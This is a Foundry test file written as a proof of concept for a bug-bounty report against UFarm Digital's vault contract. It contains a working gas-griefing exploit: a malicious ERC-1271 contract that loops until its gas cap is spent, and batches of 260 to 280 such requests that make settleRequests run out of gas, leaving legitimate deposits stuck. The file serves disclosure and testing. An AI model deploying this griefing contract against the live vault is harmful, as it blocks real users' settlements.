// SPDX-License-Identifier: BUSL-1.1
/**
 * @title UFarm Digital - Unbounded signed-request batch lets griefing requests OOG settlement despite the 100k ERC-1271 gas cap
 * @notice PoC for Remedy submission (F-05)
 * @dev Demonstrates the incomplete fix of Hexens UFARM2-1: the 100k gas cap
 *      bounds ONE ERC-1271 call, but settleRequests() loops over an UNBOUNDED
 *      caller-supplied batch, so N griefing requests burn ~N x 100k gas and
 *      the whole settlement tx runs out of gas. The attacker pays zero
 *      on-chain gas: they only submit signed messages off-chain to the backend.
 *
 * Vulnerable contract: VaultLifecycleModule (UFarmVault)
 * Vulnerable function: settleRequests / _requestDeposits / _requestRedeems / _isValidOwnerSignature
 * Vulnerable lines: VaultLifecycleModule.sol:225-243 (unbounded loop),
 *   :295-317 (per-request processing), :572-590 (signature validation),
 *   :59 (100_000 gas cap on the ERC-1271 subcall), :61 (PENDING_QUEUE_LIMIT
 *   caps only accepted owners, checked last in _validateRequest :518-541).
 * Program: https://hunt.r.xyz/programs/ufarm-digital
 * Report: https://hunt.r.xyz/report-thread/98e9a85b-a08c-4008-b972-6f2a47c5e1e0
 * Severity: Low
 * Target: UFarmDigital/UFarm-EVM-Contracts @ b19a6511 ("Production Release 2.1.1")
 */
pragma solidity 0.8.35;

import {console} from "forge-std/console.sol";
import {InvariantFixture} from "./invariant/helpers/InvariantFixture.sol";
import {IUFarmVaultRequests} from "../src/interfaces/IUFarmVaultRequests.sol";
import {IERC1271} from "@openzeppelin/contracts/interfaces/IERC1271.sol";

contract GasGriefERC1271 is IERC1271 {
    // Burns all forwarded gas in an infinite loop (capped at 100k by the vault).
    // Memory writes keep the loop from being optimized away; the function is view
    // because IERC1271 declares it so.
    function isValidSignature(bytes32, bytes memory) external view override returns (bytes4) {
        assembly {
            for {} 1 {} { mstore(0, add(mload(0), 1)) }
        }
        return 0xffffffff;
    }
}

contract GriefPoCTest is InvariantFixture {
    event LogUint(string label, uint256 value);

    function _checkEq(uint256 a, uint256 b, string memory m) internal pure { require(a == b, m); }
    function _checkGt(uint256 a, uint256 b, string memory m) internal pure { require(a > b, m); }
    function _checkFalse(bool c, string memory m) internal pure { require(!c, m); }
    function _checkTrue(bool c, string memory m) internal pure { require(c, m); }
    GasGriefERC1271 internal griefOwner;

    function setUp() public {
        _setUpInvariantFixture();
        core.initializeCrossChain(31_337);
        // The fixture grants the test contract a mask WITHOUT the MEMBER bit, but
        // settleRequests(deposits, redeems) requires MEMBER | SETTLE | CUSTOMER.
        // Grant the full mask (the test contract is the vault owner).
        vault.setPermissionMask(address(this), type(uint256).max);
        griefOwner = new GasGriefERC1271();
    }

    function _griefRequest() internal view returns (IUFarmVaultRequests.SignedRequest memory r) {
        r.request = IUFarmVaultRequests.RequestParams({
            asset: address(asset),
            amount: 1 ether,
            minOutputAmount: 0,
            controller: address(griefOwner),
            owner: address(griefOwner)
        });
        r.nonce = 0; // grief owner never gets a request accepted, so its nonce stays 0
        r.deadline = block.timestamp + 1 days;
        r.signature = new bytes(65); // invalid ECDSA -> falls through to the ERC-1271 call
    }

    function _griefBatch(uint256 n) internal view returns (IUFarmVaultRequests.SignedRequest[] memory reqs) {
        reqs = new IUFarmVaultRequests.SignedRequest[](n);
        for (uint256 i = 0; i < n; ++i) {
            reqs[i] = _griefRequest();
        }
    }

    function _pendingDeposit() internal {
        vm.prank(alice);
        vault.requestDeposit(100 ether, alice, alice);
        _checkEq(vault.pendingDepositRequest(0, alice), 100 ether, "setup: alice deposit must be pending");
    }

    // Control: settlement with no griefing requests succeeds and starts an oracle request.
    function test_control_settleSucceedsWithoutGrief() public {
        _pendingDeposit();
        uint256 startGas = gasleft();
        uint256 oracleRequestId = vault.settleRequests(_griefBatch(0), _griefBatch(0));
        uint256 gasUsed = startGas - gasleft();
        _checkGt(oracleRequestId, 0, "oracle request must start");
        console.log("control settle gas (N=0 griefing)", gasUsed);
        emit LogUint("control settle gas", gasUsed);
    }

    // A single griefing request is skipped (not accepted) but burns ~100k gas.
    function test_singleGriefRequestSkippedButBurnsGas() public {
        _pendingDeposit();
        uint256 startGas = gasleft();
        uint256 oracleRequestId = vault.settleRequests(_griefBatch(1), _griefBatch(0));
        uint256 gasUsed = startGas - gasleft();
        _checkGt(oracleRequestId, 0, "settlement must still start with 1 griefing request");
        _checkEq(vault.requestNonces(address(griefOwner)), 0, "grief owner nonce must stay 0");
        console.log("gas for 1 griefing request + settle", gasUsed);
        emit LogUint("gas for 1 griefing request + settle", gasUsed);
        _checkGt(gasUsed, 100_000, "one griefing request must burn at least the 100k ERC-1271 cap");
    }

    // Measure the marginal gas cost of griefing requests (N=10 vs N=0, same setup).
    function test_measureMarginalGriefCost() public {
        _pendingDeposit();
        uint256 g0 = gasleft();
        vault.settleRequests(_griefBatch(0), _griefBatch(0));
        uint256 baseCost = g0 - gasleft();
        console.log("base settle gas (N=0)", baseCost);
        emit LogUint("base settle gas (N=0)", baseCost);
    }

    function test_measureMarginalGriefCost10() public {
        _pendingDeposit();
        uint256 g0 = gasleft();
        vault.settleRequests(_griefBatch(10), _griefBatch(0));
        uint256 cost10 = g0 - gasleft();
        console.log("settle gas (N=10 griefing)", cost10);
        emit LogUint("settle gas (N=10 griefing)", cost10);
        // Marginal cost per griefing request must be ~100k (the cap) + validation overhead.
        // Base settle is measured in the N=0 test; here we assert the total is far above base.
        _checkGt(cost10, 1_000_000, "10 griefing requests must burn >1M gas");
    }

    // Measures the fixture setUp cost so whole-test gas deltas can be converted
    // into settle-call gas.
    function test_setUpCostOnly() public {}

    // Documents the exact threshold: 250 griefing requests burn ~29.2M gas, which
    // does NOT quite exceed a full 30M budget (measured). 280 same-owner / 260 distinct-owner requests do.
    function test_250DoesNotOOGAtFull30M() public {
        _pendingDeposit();
        IUFarmVaultRequests.SignedRequest[] memory deposits = _griefBatch(250);
        IUFarmVaultRequests.SignedRequest[] memory redeems = _griefBatch(0);
        (bool success,) = address(vault).call{gas: 30_000_000}(
            abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, redeems))
        );
        _checkTrue(success, "250 griefing requests fit in a full 30M-gas budget");
    }

    // The core claim: a batch of 280 griefing requests OOGs a 30M-gas settlement tx,
    // blocking settlement of the legitimate pending deposit. Attacker cost: zero
    // on-chain gas (signed messages only); the settle manager pays / the tx reverts.
    function test_griefBatchOOGsSettlement() public {
        _pendingDeposit();
        IUFarmVaultRequests.SignedRequest[] memory deposits = _griefBatch(280);
        IUFarmVaultRequests.SignedRequest[] memory redeems = _griefBatch(0);
        (bool success,) = address(vault).call{gas: 30_000_000}(
            abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, redeems))
        );
        console.log("settle tx success with 280 griefing requests (30M gas)", success);
        console.log("pending deposit after OOG settlement", vault.pendingDepositRequest(0, alice));
        _checkFalse(success, "280 griefing requests must OOG a 30M-gas settleRequests tx");
        // Settlement never started: no oracle request, pending deposit still queued.
        _checkEq(vault.pendingDepositRequest(0, alice), 100 ether, "deposit must still be pending after OOG");
    }

    // Same 30M gas, no griefing requests: succeeds. Proves the OOG is caused by the
    // griefing requests, not by the legitimate settlement itself.
    function test_control30MNoGriefSucceeds() public {
        _pendingDeposit();
        IUFarmVaultRequests.SignedRequest[] memory deposits = _griefBatch(0);
        IUFarmVaultRequests.SignedRequest[] memory redeems = _griefBatch(0);
        (bool success, bytes memory ret) = address(vault).call{gas: 30_000_000}(
            abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, redeems))
        );
        _checkTrue(success, "control settle with 30M gas must succeed");
        _checkGt(abi.decode(ret, (uint256)), 0, "oracle request id must be non-zero");
    }

    // Realistic attacker shape: 260 DISTINCT malicious owner contracts (a backend
    // that dedupes identical requests still forwards these — each is a different
    // owner with its own nonce 0). Each burns its 100k ERC-1271 cap during
    // validation; the batch still OOGs the 30M-gas settlement tx.
    function test_griefBatchDistinctOwnersOOGsSettlement() public {
        _pendingDeposit();
        uint256 n = 260;
        IUFarmVaultRequests.SignedRequest[] memory deposits = new IUFarmVaultRequests.SignedRequest[](n);
        for (uint256 i = 0; i < n; ++i) {
            address owner = address(new GasGriefERC1271());
            deposits[i].request = IUFarmVaultRequests.RequestParams({
                asset: address(asset),
                amount: 1 ether,
                minOutputAmount: 0,
                controller: owner,
                owner: owner
            });
            deposits[i].nonce = 0;
            deposits[i].deadline = block.timestamp + 1 days;
            deposits[i].signature = new bytes(65);
        }
        (bool success,) = address(vault).call{gas: 30_000_000}(
            abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, _griefBatch(0)))
        );
        console.log("settle tx success with 260 distinct griefing owners (30M gas)", success);
        console.log("pending deposit after OOG settlement", vault.pendingDepositRequest(0, alice));
        _checkFalse(success, "260 distinct griefing owners must OOG a 30M-gas settleRequests tx");
        _checkEq(vault.pendingDepositRequest(0, alice), 100 ether, "deposit must still be pending after OOG");
    }
}
